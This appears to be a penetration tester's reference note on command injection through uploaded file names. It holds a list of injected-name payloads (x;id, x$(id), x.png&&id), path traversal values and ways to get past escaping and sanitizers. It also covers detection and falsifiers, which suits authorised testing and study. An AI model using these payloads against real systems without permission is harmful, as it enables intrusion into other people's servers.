# Filename Injection — the name is the payload

## The shape — `filename`/`name`/`path` fields reaching shell

```
mv "$tmp" "$UPLOAD/$filename"
cp "$tmp" "$dir/$name"
convert "$dir/$filename" out.png
unzip "$f" -d "$dir"
tar xf "$dir/$f"
```

The FILENAME is a string — metacharacters inside it inject at the
`mv`/`cp`/`convert`/`identify` step.

## The injected-name payload set

```
x;id
x|id
x`id`
x$(id)
x;id;.png            — absorb the ext suffix with ;
x".png";id"          — quote escape if wrapped
x';id;'.png
x%0aid.png
x.php%00.png        — null-byte split (old)
x.png&&id
x.png||id
x.png|id
```

The trailing ext: if app appends `.png`, inject `x;id;.png` — the `.png`
becomes a literal part of `id`'s output arg... actually `x;id;.png`
tokenizes to `x`, `;`, `id`, `;`, `.png` — `.png` runs as a command
(error) — better `x;id;`+absorb trailing — `quoting.md`/`separators.md`.

## Quote-context inside the name — `filename="..."`

If the multipart's `filename="x"` header is itself the injection surface
— `filename="x\";id;\""` — CRLF/quote injection inside the disposition
header — `skills/web-file-upload/references/response-header-injection.md`.

## The path-side name — `path`/`dir`/`dest`/`target`

`path=../../etc` — traversal. `path=/tmp;x` — metachar inside path —
same injection, different slot.

## `mv`/`cp`/`rename`/`store` — the operation decides exposure

- `mv $tmp $dest` — `$dest` contains name — injection surface
- `cp`/`rsync`/`scp` — same
- `rename`/`move_uploaded_file` — PHP-side (not shell — unless the app
  shells out to `mv`)

## The `basename`/sanitization test — is the name cleaned?

`basename($name)`, `realpath`, `preg_replace('/[^a-z0-9.-]/','',...)` —
which chars survive?

- `basename` strips `/` — `../x` → `x` — traversal dead but `;` survives!
- `preg_replace`/`str_replace` char-allowlist — test which bytes pass

Probe the name with each separator char: `x;y.png`, `x|y.png`, `x$y.png`,
`x\`y\`.png` — which reaches the shell?

## The "the name IS the file" upload — `skills/web-file-upload/references/archive-attacks.md`

In a zip/tar, the ENTRY name is the file — `../../x`/`x;id` inside the
archive's name field — extractor writes it there or shells it.

## The multi-level name — `name`, `filename`, `path`, `ext` fields

Multiparts carry `name=` (field), `filename=` (file), plus app-level
`dir`/`path`/`subdir`/`ext`/`target`/`saveas` fields — each is a
separate injection slot. Test each.

## Detection — which name flows to a command?

- white-box: `mv`, `cp`, `convert`, `system`, `exec`, `shell_exec`,
  `ProcessBuilder` taking `filename`/`name`/`path`
- black-box: inject `x;id.png` — watch for `id` output/error/
  `uid=`/`sh: x;id.png` echoes — the error may echo the composed
  command string, leaking the template

## The "the name gets URL-encoded/escaped" counter

- `escapeshellarg($name)` → `'...'` — `'` in name → `'\''` — quote-close
  escape needed — `quoting.md`
- `escapeshellcmd` → `;`/`|`/`&` escaped — argv-only
- `basename()`/`realpath()` — `/` stripped
- `filter_var`/`preg` allowlist — bytes filtered

## Falsifiers

- the name is sanitized to a safe charset AND the write is
  `move_uploaded_file`/`rename` (not a shell call)
- no shell receives the name

## Output to record

- which name-field flows to a shell + which bytes survive + the
  verbatim evidence
